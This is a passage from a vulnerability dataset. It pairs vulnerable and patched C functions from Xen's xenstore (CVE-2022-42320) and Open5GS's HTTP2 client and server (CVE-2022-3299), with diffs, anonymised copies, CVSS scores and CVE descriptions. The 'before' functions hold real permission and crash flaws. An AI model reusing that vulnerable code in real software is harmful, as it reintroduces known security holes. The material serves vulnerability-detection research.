	fire_watches(VAR_1, VAR_0, VAR_5, node, false, &VAR_4);
	send_ack(VAR_1, VAR_15);

	return 0;
}",xen-project/xen/ab128218225d3542596ca3a02aee80d55494bef8/xenstored_core.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -21,6 +21,11 @@
 		return ENOMEM;
 	if (!xs_strings_to_perms(perms.p, perms.num, permstr))
 		return errno;
+
+	if (domain_alloc_permrefs(&perms) < 0)
+		return ENOMEM;
+	if (perms.p[0].perms & XS_PERM_IGNORE)
+		return ENOENT;
 
 	/* First arg is node name. */
 	if (strstarts(in->buffer, ""@"")) {","{'deleted_lines': [], 'added_lines': ['', '\tif (domain_alloc_permrefs(&perms) < 0)', '\t\treturn ENOMEM;', '\tif (perms.p[0].perms & XS_PERM_IGNORE)', '\t\treturn ENOENT;']}",True,"Xenstore: Guests can get access to Xenstore nodes of deleted domains Access rights of Xenstore nodes are per domid. When a domain is gone, there might be Xenstore nodes left with access rights containing the domid of the removed domain. This is normally no problem, as those access right entries will be corrected when such a node is written later. There is a small time window when a new domain is created, where the access rights of a past domain with the same domid as the new one will be regarded to be still valid, leading to the new domain being able to get access to a node which was meant to be accessible by the removed domain. For this to happen another domain needs to write the node before the newly created domain is being introduced to Xenstore by dom0.",7.0,HIGH,2,valid,2022-09-13T05:35:10Z,4
CVE-2022-42320,['CWE-459'],CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H,1,xen-project/xen,"tools/xenstore: fix checking node permissions

Today chk_domain_generation() is being used to check whether a node
permission entry is still valid or whether it is referring to a domain
no longer existing. This is done by comparing the node's and the
domain's generation count.

In case no struct domain is existing for a checked domain, but the
domain itself is valid, chk_domain_generation() assumes it is being
called due to the first node created for a new domain and it will
return success.

This might be wrong in case the checked permission is related to an
old domain, which has just been replaced with a new domain using the
same domid.

Fix that by letting chk_domain_generation() fail in case a struct
domain isn't found. In order to cover the case of the first node for
a new domain try to allocate the needed struct domain explicitly when
processing the related SET_PERMS command. In case a referenced domain
isn't existing, flag the related permission to be ignored right away.

This is XSA-417 / CVE-2022-42320.

Signed-off-by: Juergen Gross <jgross@suse.com>
Reviewed-by: Julien Grall <jgrall@amazon.com>",ab128218225d3542596ca3a02aee80d55494bef8,https://github.com/xen-project/xen/commit/ab128218225d3542596ca3a02aee80d55494bef8,tools/xenstore/xenstored_domain.c,chk_domain_generation,"static int chk_domain_generation(unsigned int domid, uint64_t gen)
{
struct domain *d;
xc_dominfo_t dominfo;
if (!xc_handle && domid == 0)
return 1;
d = find_domain_struct(domid);
if (d)
return (d->generation <= gen) ? 1 : 0;
if (!get_domain_info(domid, &dominfo))
return 0;
d = alloc_domain(NULL, domid);
return d ? 1 : -1;
}","static int chk_domain_generation(unsigned int VAR_0, uint64_t VAR_1)
{
struct domain *VAR_2;
xc_dominfo_t VAR_3;
if (!VAR_4 && VAR_0 == 0)
return 1;
VAR_2 = find_domain_struct(VAR_0);
if (VAR_2)
return (VAR_2->generation <= VAR_1) ? 1 : 0;
if (!get_domain_info(VAR_0, &VAR_3))
return 0;
VAR_2 = alloc_domain(NULL, VAR_0);
return VAR_2 ? 1 : -1;
}",xen-project/xen/ab128218225d3542596ca3a02aee80d55494bef8/xenstored_domain.c/vul/before/1.json,"static int chk_domain_generation(unsigned int domid, uint64_t gen)
{
	struct domain *d;

	if (!xc_handle && domid == 0)
		return 1;

	d = find_domain_struct(domid);

	return (d && d->generation <= gen) ? 1 : 0;
}","static int chk_domain_generation(unsigned int VAR_0, uint64_t VAR_1)
{
	struct domain *VAR_2;

	if (!VAR_3 && VAR_0 == 0)
		return 1;

	VAR_2 = find_domain_struct(VAR_0);

	return (VAR_2 && VAR_2->generation <= VAR_1) ? 1 : 0;
}",xen-project/xen/ab128218225d3542596ca3a02aee80d55494bef8/xenstored_domain.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -1,18 +1,11 @@
 static int chk_domain_generation(unsigned int domid, uint64_t gen)
 {
 	struct domain *d;
-	xc_dominfo_t dominfo;
 
 	if (!xc_handle && domid == 0)
 		return 1;
 
 	d = find_domain_struct(domid);
-	if (d)
-		return (d->generation <= gen) ? 1 : 0;
 
-	if (!get_domain_info(domid, &dominfo))
-		return 0;
-
-	d = alloc_domain(NULL, domid);
-	return d ? 1 : -1;
+	return (d && d->generation <= gen) ? 1 : 0;
 }","{'deleted_lines': ['\txc_dominfo_t dominfo;', '\tif (d)', '\t\treturn (d->generation <= gen) ? 1 : 0;', '\tif (!get_domain_info(domid, &dominfo))', '\t\treturn 0;', '', '\td = alloc_domain(NULL, domid);', '\treturn d ? 1 : -1;'], 'added_lines': ['\treturn (d && d->generation <= gen) ? 1 : 0;']}",True,"Xenstore: Guests can get access to Xenstore nodes of deleted domains Access rights of Xenstore nodes are per domid. When a domain is gone, there might be Xenstore nodes left with access rights containing the domid of the removed domain. This is normally no problem, as those access right entries will be corrected when such a node is written later. There is a small time window when a new domain is created, where the access rights of a past domain with the same domid as the new one will be regarded to be still valid, leading to the new domain being able to get access to a node which was meant to be accessible by the removed domain. For this to happen another domain needs to write the node before the newly created domain is being introduced to Xenstore by dom0.",7.0,HIGH,2,valid,2022-09-13T05:35:10Z,4
CVE-2022-3299,['CWE-404'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,1,open5gs,Fixed HTTP2 crashes for random JSON data (#1769),724fa568435dae45ef0c3a48b2aabde052afae88,https://github.com/open5gs/open5gs/commit/724fa568435dae45ef0c3a48b2aabde052afae88,lib/sbi/client.c,check_multi_info,"static void check_multi_info(ogs_sbi_client_t *client)
{
CURLM *multi = NULL;
CURLMsg *resource;
int pending;
CURL *easy = NULL;
CURLcode res;
connection_t *conn = NULL;
ogs_sbi_response_t *response = NULL;
ogs_assert(client);
multi = client->multi;
ogs_assert(multi);
while ((resource = curl_multi_info_read(multi, &pending))) {
char *url;
char *content_type = NULL;
long res_status;
ogs_assert(resource);
switch (resource->msg) {
case CURLMSG_DONE:
easy = resource->easy_handle;
ogs_assert(easy);
curl_easy_getinfo(easy, CURLINFO_PRIVATE, &conn);
ogs_assert(conn);
curl_easy_getinfo(easy, CURLINFO_EFFECTIVE_URL, &url);
curl_easy_getinfo(easy, CURLINFO_RESPONSE_CODE, &res_status);
curl_easy_getinfo(easy, CURLINFO_CONTENT_TYPE, &content_type);
res = resource->data.result;
if (res == CURLE_OK) {
response = ogs_sbi_response_new();
ogs_assert(response);
response->status = res_status;
ogs_assert(conn->method);
response->h.method = ogs_strdup(conn->method);
ogs_assert(response->h.method);
/* remove https:                response->h.uri = ogs_strdup(url);
ogs_assert(response->h.uri);
ogs_debug(""[%d:%s] %s"",
response->status, response->h.method, response->h.uri);
if (conn->memory) {
response->http.content =
ogs_memdup(conn->memory, conn->size + 1);
ogs_assert(response->http.content);
response->http.content_length = conn->size;
ogs_assert(response->http.content_length);
}
ogs_debug(""RECEIVED[%d]"", (int)response->http.content_length);
if (response->http.content_length && response->http.content)
ogs_debug(""%s"", response->http.content);
if (content_type)
ogs_sbi_header_set(response->http.headers,
OGS_SBI_CONTENT_TYPE, content_type);
if (conn->location)
ogs_sbi_header_set(response->http.headers,
OGS_SBI_LOCATION, conn->location);
} else
ogs_warn(""[%d] %s"", res, conn->error);
ogs_assert(conn->client_cb);
conn->client_cb(res == CURLE_OK ? OGS_OK : OGS_ERROR,
response, conn->data);
connection_remove(conn);
break;
default:
ogs_error(""Unknown CURL resource[%d]"", resource->msg);
break;
}
}
}","static void check_multi_info(ogs_sbi_client_t *VAR_0)
{
CURLM *VAR_1 = NULL;
CURLMsg *VAR_2;
int VAR_3;
CURL *VAR_4 = NULL;
CURLcode VAR_5;
connection_t *VAR_6 = NULL;
ogs_sbi_response_t *VAR_7 = NULL;
ogs_assert(VAR_0);
VAR_1 = VAR_0->multi;
ogs_assert(VAR_1);
while ((VAR_2 = curl_multi_info_read(VAR_1, &VAR_3))) {
char *VAR_8;
char *VAR_9 = NULL;
long VAR_10;
ogs_assert(VAR_2);
switch (VAR_2->msg) {
case VAR_11:
VAR_4 = VAR_2->easy_handle;
ogs_assert(VAR_4);
curl_easy_getinfo(VAR_4, VAR_12, &VAR_6);
ogs_assert(VAR_6);
curl_easy_getinfo(VAR_4, VAR_13, &VAR_8);
curl_easy_getinfo(VAR_4, VAR_14, &VAR_10);
curl_easy_getinfo(VAR_4, VAR_15, &VAR_9);
VAR_5 = VAR_2->data.result;
if (VAR_5 == VAR_16) {
VAR_7 = ogs_sbi_response_new();
ogs_assert(VAR_7);
VAR_7->status = VAR_10;
ogs_assert(VAR_6->method);
VAR_7->h.method = ogs_strdup(VAR_6->method);
ogs_assert(VAR_7->h.method);
VAR_7->h.uri = ogs_strdup(VAR_8);
ogs_assert(VAR_7->h.uri);
ogs_debug(""[%d:%s] %s"",
VAR_7->status, VAR_7->h.method, VAR_7->h.uri);
if (VAR_6->memory) {
VAR_7->http.content =
ogs_memdup(VAR_6->memory, VAR_6->size + 1);
ogs_assert(VAR_7->http.content);
VAR_7->http.content_length = VAR_6->size;
ogs_assert(VAR_7->http.content_length);
}
ogs_debug(""RECEIVED[%d]"", (int)VAR_7->http.content_length);
if (VAR_7->http.content_length && VAR_7->http.content)
ogs_debug(""%s"", VAR_7->http.content);
if (VAR_9)
ogs_sbi_header_set(VAR_7->http.headers,
VAR_17, VAR_9);
if (VAR_6->location)
ogs_sbi_header_set(VAR_7->http.headers,
VAR_18, VAR_6->location);
} else
ogs_warn(""[%d] %s"", VAR_5, VAR_6->error);
ogs_assert(VAR_6->client_cb);
VAR_6->client_cb(VAR_5 == VAR_16 ? VAR_19 : VAR_20,
VAR_7, VAR_6->data);
connection_remove(VAR_6);
break;
default:
ogs_error(""Unknown CURL resource[%d]"", VAR_2->msg);
break;
}
}
}",open5gs/724fa568435dae45ef0c3a48b2aabde052afae88/client.c/vul/before/0.json,"static void check_multi_info(ogs_sbi_client_t *client)
{
    CURLM *multi = NULL;
    CURLMsg *resource;
    int pending;
    CURL *easy = NULL;
    CURLcode res;
    connection_t *conn = NULL;
    ogs_sbi_response_t *response = NULL;

    ogs_assert(client);
    multi = client->multi;
    ogs_assert(multi);

    while ((resource = curl_multi_info_read(multi, &pending))) {
        char *url;
        char *content_type = NULL;
        long res_status;
        ogs_assert(resource);

        switch (resource->msg) {
        case CURLMSG_DONE:
            easy = resource->easy_handle;
            ogs_assert(easy);

            curl_easy_getinfo(easy, CURLINFO_PRIVATE, &conn);
            ogs_assert(conn);

            curl_easy_getinfo(easy, CURLINFO_EFFECTIVE_URL, &url);
            curl_easy_getinfo(easy, CURLINFO_RESPONSE_CODE, &res_status);
            curl_easy_getinfo(easy, CURLINFO_CONTENT_TYPE, &content_type);

            res = resource->data.result;
            if (res == CURLE_OK) {
                ogs_log_level_e level = OGS_LOG_DEBUG;

                response = ogs_sbi_response_new();
                ogs_assert(response);

                response->status = res_status;

                ogs_assert(conn->method);
                response->h.method = ogs_strdup(conn->method);
                ogs_assert(response->h.method);

                /* remove https://localhost:8000 */
                response->h.uri = ogs_strdup(url);
                ogs_assert(response->h.uri);

                if (content_type)
                    ogs_sbi_header_set(response->http.headers,
                            OGS_SBI_CONTENT_TYPE, content_type);
                if (conn->location)
                    ogs_sbi_header_set(response->http.headers,
                            OGS_SBI_LOCATION, conn->location);

                if (conn->memory_overflow == true)
                    level = OGS_LOG_ERROR;

                ogs_log_message(level, 0, ""[%d:%s] %s"",
                        response->status, response->h.method, response->h.uri);

                if (conn->memory) {
                    response->http.content =
                        ogs_memdup(conn->memory, conn->size + 1);
                    ogs_assert(response->http.content);
                    response->http.content_length = conn->size;
                    ogs_assert(response->http.content_length);
                }

                ogs_log_message(level, 0, ""RECEIVED[%d]"",
                        (int)response->http.content_length);
                if (response->http.content_length && response->http.content)
                    ogs_log_message(level, 0, ""%s"", response->http.content);

                if (conn->memory_overflow == true) {
                    ogs_sbi_response_free(response);
                    connection_remove(conn);
                    break;
                }

            } else
                ogs_warn(""[%d] %s"", res, conn->error);

            ogs_assert(conn->client_cb);
            conn->client_cb(res == CURLE_OK ? OGS_OK : OGS_ERROR,
                            response, conn->data);
            connection_remove(conn);
            break;
        default:
            ogs_error(""Unknown CURL resource[%d]"", resource->msg);
            break;
        }
    }
}","static void check_multi_info(ogs_sbi_client_t *VAR_0)
{
    CURLM *VAR_1 = NULL;
    CURLMsg *VAR_2;
    int VAR_3;
    CURL *VAR_4 = NULL;
    CURLcode VAR_5;
    connection_t *VAR_6 = NULL;
    ogs_sbi_response_t *VAR_7 = NULL;

    ogs_assert(VAR_0);
    VAR_1 = VAR_0->multi;
    ogs_assert(VAR_1);

    while ((VAR_2 = curl_multi_info_read(VAR_1, &VAR_3))) {
        char *VAR_8;
        char *VAR_9 = NULL;
        long VAR_10;
        ogs_assert(VAR_2);

        switch (VAR_2->msg) {
        case VAR_11:
            VAR_4 = VAR_2->easy_handle;
            ogs_assert(VAR_4);

            curl_easy_getinfo(VAR_4, VAR_12, &VAR_6);
            ogs_assert(VAR_6);

            curl_easy_getinfo(VAR_4, VAR_13, &VAR_8);
            curl_easy_getinfo(VAR_4, VAR_14, &VAR_10);
            curl_easy_getinfo(VAR_4, VAR_15, &VAR_9);

            VAR_5 = VAR_2->data.result;
            if (VAR_5 == VAR_16) {
                ogs_log_level_e VAR_17 = VAR_18;

                VAR_7 = ogs_sbi_response_new();
                ogs_assert(VAR_7);

                VAR_7->status = VAR_10;

                ogs_assert(VAR_6->method);
                VAR_7->h.method = ogs_strdup(VAR_6->method);
                ogs_assert(VAR_7->h.method);

                /* COMMENT_0 */
                VAR_7->h.uri = ogs_strdup(VAR_8);
                ogs_assert(VAR_7->h.uri);

                if (VAR_9)
                    ogs_sbi_header_set(VAR_7->http.headers,
                            VAR_19, VAR_9);
                if (VAR_6->location)
                    ogs_sbi_header_set(VAR_7->http.headers,
                            VAR_20, VAR_6->location);

                if (VAR_6->memory_overflow == true)
                    VAR_17 = VAR_21;

                ogs_log_message(VAR_17, 0, ""[%d:%s] %s"",
                        VAR_7->status, VAR_7->h.method, VAR_7->h.uri);

                if (VAR_6->memory) {
                    VAR_7->http.content =
                        ogs_memdup(VAR_6->memory, VAR_6->size + 1);
                    ogs_assert(VAR_7->http.content);
                    VAR_7->http.content_length = VAR_6->size;
                    ogs_assert(VAR_7->http.content_length);
                }

                ogs_log_message(VAR_17, 0, ""RECEIVED[%d]"",
                        (int)VAR_7->http.content_length);
                if (VAR_7->http.content_length && VAR_7->http.content)
                    ogs_log_message(VAR_17, 0, ""%s"", VAR_7->http.content);

                if (VAR_6->memory_overflow == true) {
                    ogs_sbi_response_free(VAR_7);
                    connection_remove(VAR_6);
                    break;
                }

            } else
                ogs_warn(""[%d] %s"", VAR_5, VAR_6->error);

            ogs_assert(VAR_6->client_cb);
            VAR_6->client_cb(VAR_5 == VAR_16 ? VAR_22 : VAR_23,
                            VAR_7, VAR_6->data);
            connection_remove(VAR_6);
            break;
        default:
            ogs_error(""Unknown CURL resource[%d]"", VAR_2->msg);
            break;
        }
    }
}",open5gs/724fa568435dae45ef0c3a48b2aabde052afae88/client.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -32,6 +32,8 @@
 
             res = resource->data.result;
             if (res == CURLE_OK) {
+                ogs_log_level_e level = OGS_LOG_DEBUG;
+
                 response = ogs_sbi_response_new();
                 ogs_assert(response);
 
@@ -45,7 +47,17 @@
                 response->h.uri = ogs_strdup(url);
                 ogs_assert(response->h.uri);
 
-                ogs_debug(""[%d:%s] %s"",
+                if (content_type)
+                    ogs_sbi_header_set(response->http.headers,
+                            OGS_SBI_CONTENT_TYPE, content_type);
+                if (conn->location)
+                    ogs_sbi_header_set(response->http.headers,
+                            OGS_SBI_LOCATION, conn->location);
+
+                if (conn->memory_overflow == true)
+                    level = OGS_LOG_ERROR;
+
+                ogs_log_message(level, 0, ""[%d:%s] %s"",
                         response->status, response->h.method, response->h.uri);
 
                 if (conn->memory) {
@@ -56,16 +68,17 @@
                     ogs_assert(response->http.content_length);
                 }
 
-                ogs_debug(""RECEIVED[%d]"", (int)response->http.content_length);
+                ogs_log_message(level, 0, ""RECEIVED[%d]"",
+                        (int)response->http.content_length);
                 if (response->http.content_length && response->http.content)
-                    ogs_debug(""%s"", response->http.content);
+                    ogs_log_message(level, 0, ""%s"", response->http.content);
 
-                if (content_type)
-                    ogs_sbi_header_set(response->http.headers,
-                            OGS_SBI_CONTENT_TYPE, content_type);
-                if (conn->location)
-                    ogs_sbi_header_set(response->http.headers,
-                            OGS_SBI_LOCATION, conn->location);
+                if (conn->memory_overflow == true) {
+                    ogs_sbi_response_free(response);
+                    connection_remove(conn);
+                    break;
+                }
+
             } else
                 ogs_warn(""[%d] %s"", res, conn->error);
 ","{'deleted_lines': ['                ogs_debug(""[%d:%s] %s"",', '                ogs_debug(""RECEIVED[%d]"", (int)response->http.content_length);', '                    ogs_debug(""%s"", response->http.content);', '                if (content_type)', '                    ogs_sbi_header_set(response->http.headers,', '                            OGS_SBI_CONTENT_TYPE, content_type);', '                if (conn->location)', '                    ogs_sbi_header_set(response->http.headers,', '                            OGS_SBI_LOCATION, conn->location);'], 'added_lines': ['                ogs_log_level_e level = OGS_LOG_DEBUG;', '', '                if (content_type)', '                    ogs_sbi_header_set(response->http.headers,', '                            OGS_SBI_CONTENT_TYPE, content_type);', '                if (conn->location)', '                    ogs_sbi_header_set(response->http.headers,', '                            OGS_SBI_LOCATION, conn->location);', '', '                if (conn->memory_overflow == true)', '                    level = OGS_LOG_ERROR;', '', '                ogs_log_message(level, 0, ""[%d:%s] %s"",', '                ogs_log_message(level, 0, ""RECEIVED[%d]"",', '                        (int)response->http.content_length);', '                    ogs_log_message(level, 0, ""%s"", response->http.content);', '                if (conn->memory_overflow == true) {', '                    ogs_sbi_response_free(response);', '                    connection_remove(conn);', '                    break;', '                }', '']}",True,A vulnerability was found in Open5GS up to 2.4.10. It has been declared as problematic. Affected by this vulnerability is an unknown functionality in the library lib/sbi/client.c of the component AMF. The manipulation leads to denial of service. The attack can be launched remotely. The name of the patch is 724fa568435dae45ef0c3a48b2aabde052afae88. It is recommended to apply a patch to fix this issue. The identifier VDB-209545 was assigned to this vulnerability.,6.5,MEDIUM,1,valid,2022-09-25T06:06:37Z,4
CVE-2022-3299,['CWE-404'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,1,open5gs,Fixed HTTP2 crashes for random JSON data (#1769),724fa568435dae45ef0c3a48b2aabde052afae88,https://github.com/open5gs/open5gs/commit/724fa568435dae45ef0c3a48b2aabde052afae88,lib/sbi/client.c,write_cb,"static size_t write_cb(void *contents, size_t size, size_t nmemb, void *data)
{
size_t realsize = 0;
connection_t *conn = NULL;
char *ptr = NULL;
conn = data;
ogs_assert(conn);
realsize = size * nmemb;
ptr = ogs_realloc(conn->memory, conn->size + realsize + 1);
if(!ptr) {
ogs_fatal(""not enough memory (realloc returned NULL)"");
ogs_assert_if_reached();
return 0;
}
conn->memory = ptr;
memcpy(&(conn->memory[conn->size]), contents, realsize);
conn->size += realsize;
conn->memory[conn->size] = 0;
return realsize;
}","static size_t write_cb(void *VAR_0, size_t VAR_1, size_t VAR_2, void *VAR_3)
{
size_t VAR_4 = 0;
connection_t *VAR_5 = NULL;
char *VAR_6 = NULL;
VAR_5 = VAR_3;
ogs_assert(VAR_5);
VAR_4 = VAR_1 * VAR_2;
VAR_6 = ogs_realloc(VAR_5->memory, VAR_5->size + VAR_4 + 1);
if(!VAR_6) {
ogs_fatal(""not enough memory (realloc returned NULL)"");
ogs_assert_if_reached();
return 0;
}
VAR_5->memory = VAR_6;
memcpy(&(VAR_5->memory[VAR_5->size]), VAR_0, VAR_4);
VAR_5->size += VAR_4;
VAR_5->memory[VAR_5->size] = 0;
return VAR_4;
}",open5gs/724fa568435dae45ef0c3a48b2aabde052afae88/client.c/vul/before/1.json,"static size_t write_cb(void *contents, size_t size, size_t nmemb, void *data)
{
    size_t realsize = 0;
    connection_t *conn = NULL;
    char *ptr = NULL;

    conn = data;
    ogs_assert(conn);

    realsize = size * nmemb;
    ptr = ogs_realloc(conn->memory, conn->size + realsize + 1);
    if(!ptr) {
        conn->memory_overflow = true;

        ogs_error(""Overflow : conn->size[%d], realsize[%d]"",
                    (int)conn->size, (int)realsize);
        ogs_log_hexdump(OGS_LOG_ERROR, contents, realsize);

        return 0;
    }

    conn->memory = ptr;
    memcpy(&(conn->memory[conn->size]), contents, realsize);
    conn->size += realsize;
    conn->memory[conn->size] = 0;

    return realsize;
}","static size_t write_cb(void *VAR_0, size_t VAR_1, size_t VAR_2, void *VAR_3)
{
    size_t VAR_4 = 0;
    connection_t *VAR_5 = NULL;
    char *VAR_6 = NULL;

    VAR_5 = VAR_3;
    ogs_assert(VAR_5);

    VAR_4 = VAR_1 * VAR_2;
    VAR_6 = ogs_realloc(VAR_5->memory, VAR_5->size + VAR_4 + 1);
    if(!VAR_6) {
        VAR_5->memory_overflow = true;

        ogs_error(""Overflow : conn->size[%d], realsize[%d]"",
                    (int)VAR_5->size, (int)VAR_4);
        ogs_log_hexdump(VAR_7, VAR_0, VAR_4);

        return 0;
    }

    VAR_5->memory = VAR_6;
    memcpy(&(VAR_5->memory[VAR_5->size]), VAR_0, VAR_4);
    VAR_5->size += VAR_4;
    VAR_5->memory[VAR_5->size] = 0;

    return VAR_4;
}",open5gs/724fa568435dae45ef0c3a48b2aabde052afae88/client.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -10,8 +10,12 @@
     realsize = size * nmemb;
     ptr = ogs_realloc(conn->memory, conn->size + realsize + 1);
     if(!ptr) {
-        ogs_fatal(""not enough memory (realloc returned NULL)"");
-        ogs_assert_if_reached();
+        conn->memory_overflow = true;
+
+        ogs_error(""Overflow : conn->size[%d], realsize[%d]"",
+                    (int)conn->size, (int)realsize);
+        ogs_log_hexdump(OGS_LOG_ERROR, contents, realsize);
+
         return 0;
     }
 ","{'deleted_lines': ['        ogs_fatal(""not enough memory (realloc returned NULL)"");', '        ogs_assert_if_reached();'], 'added_lines': ['        conn->memory_overflow = true;', '', '        ogs_error(""Overflow : conn->size[%d], realsize[%d]"",', '                    (int)conn->size, (int)realsize);', '        ogs_log_hexdump(OGS_LOG_ERROR, contents, realsize);', '']}",True,A vulnerability was found in Open5GS up to 2.4.10. It has been declared as problematic. Affected by this vulnerability is an unknown functionality in the library lib/sbi/client.c of the component AMF. The manipulation leads to denial of service. The attack can be launched remotely. The name of the patch is 724fa568435dae45ef0c3a48b2aabde052afae88. It is recommended to apply a patch to fix this issue. The identifier VDB-209545 was assigned to this vulnerability.,6.5,MEDIUM,1,valid,2022-09-25T06:06:37Z,4
CVE-2022-3299,['CWE-404'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,1,open5gs,Fixed HTTP2 crashes for random JSON data (#1769),724fa568435dae45ef0c3a48b2aabde052afae88,https://github.com/open5gs/open5gs/commit/724fa568435dae45ef0c3a48b2aabde052afae88,lib/sbi/nghttp2-server.c,on_data_chunk_recv,"static int on_data_chunk_recv(nghttp2_session *session, uint8_t flags,
int32_t stream_id, const uint8_t *data,
size_t len, void *user_data)
{
ogs_sbi_stream_t *stream = NULL;
ogs_sbi_request_t *request = NULL;
size_t offset = 0;
ogs_assert(session);
stream = nghttp2_session_get_stream_user_data(session, stream_id);
if (!stream) {
ogs_error(""no stream [%d]"", stream_id);
return 0;
}
request = stream->request;
ogs_assert(request);
ogs_assert(data);
ogs_assert(len);
if (request->http.content == NULL) {
request->http.content_length = len;
request->http.content =
(char*)ogs_malloc(request->http.content_length + 1);
ogs_assert(request->http.content);
} else {
offset = request->http.content_length;
if ((request->http.content_length + len) > OGS_HUGE_LEN) {
ogs_error(""Overflow : Content-Length[%d], len[%d]"",
(int)request->http.content_length, (int)len);
ogs_assert_if_reached();
}
request->http.content_length += len;
request->http.content = (char *)ogs_realloc(
request->http.content, request->http.content_length + 1);
ogs_assert(request->http.content);
}
memcpy(request->http.content + offset, data, len);
request->http.content[request->http.content_length] = '\0';
return 0;
}","static int on_data_chunk_recv(nghttp2_session *VAR_0, uint8_t VAR_1,
int32_t VAR_2, const uint8_t *VAR_3,
size_t VAR_4, void *VAR_5)
{
ogs_sbi_stream_t *VAR_6 = NULL;
ogs_sbi_request_t *VAR_7 = NULL;
size_t VAR_8 = 0;
ogs_assert(VAR_0);
VAR_6 = nghttp2_session_get_stream_user_data(VAR_0, VAR_2);
if (!VAR_6) {
ogs_error(""no stream [%d]"", VAR_2);
return 0;
}
VAR_7 = VAR_6->request;
ogs_assert(VAR_7);
ogs_assert(VAR_3);
ogs_assert(VAR_4);
if (VAR_7->http.content == NULL) {
VAR_7->http.content_length = VAR_4;
VAR_7->http.content =
(char*)ogs_malloc(VAR_7->http.content_length + 1);
ogs_assert(VAR_7->http.content);
} else {
VAR_8 = VAR_7->http.content_length;
if ((VAR_7->http.content_length + VAR_4) > VAR_9) {
ogs_error(""Overflow : Content-Length[%d], len[%d]"",
(int)VAR_7->http.content_length, (int)VAR_4);
ogs_assert_if_reached();
}
VAR_7->http.content_length += VAR_4;
VAR_7->http.content = (char *)ogs_realloc(
VAR_7->http.content, VAR_7->http.content_length + 1);
ogs_assert(VAR_7->http.content);
}
memcpy(VAR_7->http.content + VAR_8, VAR_3, VAR_4);
VAR_7->http.content[VAR_7->http.content_length] = '\0';
return 0;
}",open5gs/724fa568435dae45ef0c3a48b2aabde052afae88/nghttp2-server.c/vul/before/0.json,"static int on_data_chunk_recv(nghttp2_session *session, uint8_t flags,
                              int32_t stream_id, const uint8_t *data,
                              size_t len, void *user_data)
{
    ogs_sbi_stream_t *stream = NULL;
    ogs_sbi_request_t *request = NULL;

    size_t offset = 0;

    ogs_assert(session);

    stream = nghttp2_session_get_stream_user_data(session, stream_id);
    if (!stream) {
        ogs_error(""no stream [%d]"", stream_id);
        return 0;
    }

    request = stream->request;
    ogs_assert(request);

    ogs_assert(data);
    ogs_assert(len);

    if (request->http.content == NULL) {
        ogs_assert(request->http.content_length == 0);
        ogs_assert(offset == 0);

        request->http.content = (char*)ogs_malloc(len + 1);
    } else {
        ogs_assert(request->http.content_length != 0);

        request->http.content = (char*)ogs_realloc(
                request->http.content, request->http.content_length + len + 1);
    }

    if (!request->http.content) {
        stream->memory_overflow = true;

        ogs_error(""Overflow : Content-Length[%d], len[%d]"",
                    (int)request->http.content_length, (int)len);
        ogs_log_hexdump(OGS_LOG_ERROR, data, len);

        return 0;
    }

    offset = request->http.content_length;
    request->http.content_length += len;

    memcpy(request->http.content + offset, data, len);
    request->http.content[request->http.content_length] = '\0';

    return 0;
}","static int on_data_chunk_recv(nghttp2_session *VAR_0, uint8_t VAR_1,
                              int32_t VAR_2, const uint8_t *VAR_3,
                              size_t VAR_4, void *VAR_5)
{
    ogs_sbi_stream_t *VAR_6 = NULL;
    ogs_sbi_request_t *VAR_7 = NULL;

    size_t VAR_8 = 0;

    ogs_assert(VAR_0);

    VAR_6 = nghttp2_session_get_stream_user_data(VAR_0, VAR_2);
    if (!VAR_6) {
        ogs_error(""no stream [%d]"", VAR_2);
        return 0;
    }

    VAR_7 = VAR_6->request;
    ogs_assert(VAR_7);

    ogs_assert(VAR_3);
    ogs_assert(VAR_4);

    if (VAR_7->http.content == NULL) {
        ogs_assert(VAR_7->http.content_length == 0);
        ogs_assert(VAR_8 == 0);

        VAR_7->http.content = (char*)ogs_malloc(VAR_4 + 1);
    } else {
        ogs_assert(VAR_7->http.content_length != 0);

        VAR_7->http.content = (char*)ogs_realloc(
                VAR_7->http.content, VAR_7->http.content_length + VAR_4 + 1);
    }

    if (!VAR_7->http.content) {
        VAR_6->memory_overflow = true;

        ogs_error(""Overflow : Content-Length[%d], len[%d]"",
                    (int)VAR_7->http.content_length, (int)VAR_4);
        ogs_log_hexdump(VAR_9, VAR_3, VAR_4);

        return 0;
    }

    VAR_8 = VAR_7->http.content_length;
    VAR_7->http.content_length += VAR_4;

    memcpy(VAR_7->http.content + VAR_8, VAR_3, VAR_4);
    VAR_7->http.content[VAR_7->http.content_length] = '\0';

    return 0;
}",open5gs/724fa568435dae45ef0c3a48b2aabde052afae88/nghttp2-server.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -22,22 +22,29 @@
     ogs_assert(len);
 
     if (request->http.content == NULL) {
-        request->http.content_length = len;
-        request->http.content =
-            (char*)ogs_malloc(request->http.content_length + 1);
-        ogs_assert(request->http.content);
+        ogs_assert(request->http.content_length == 0);
+        ogs_assert(offset == 0);
+
+        request->http.content = (char*)ogs_malloc(len + 1);
     } else {
-        offset = request->http.content_length;
-        if ((request->http.content_length + len) > OGS_HUGE_LEN) {
-            ogs_error(""Overflow : Content-Length[%d], len[%d]"",
-                        (int)request->http.content_length, (int)len);
-            ogs_assert_if_reached();
-        }
-        request->http.content_length += len;
-        request->http.content = (char *)ogs_realloc(
-                request->http.content, request->http.content_length + 1);
-        ogs_assert(request->http.content);
+        ogs_assert(request->http.content_length != 0);
+
+        request->http.content = (char*)ogs_realloc(
+                request->http.content, request->http.content_length + len + 1);
     }
+
+    if (!request->http.content) {
+        stream->memory_overflow = true;
+
+        ogs_error(""Overflow : Content-Length[%d], len[%d]"",
+                    (int)request->http.content_length, (int)len);
+        ogs_log_hexdump(OGS_LOG_ERROR, data, len);
+
+        return 0;
+    }
+
+    offset = request->http.content_length;
+    request->http.content_length += len;
 
     memcpy(request->http.content + offset, data, len);
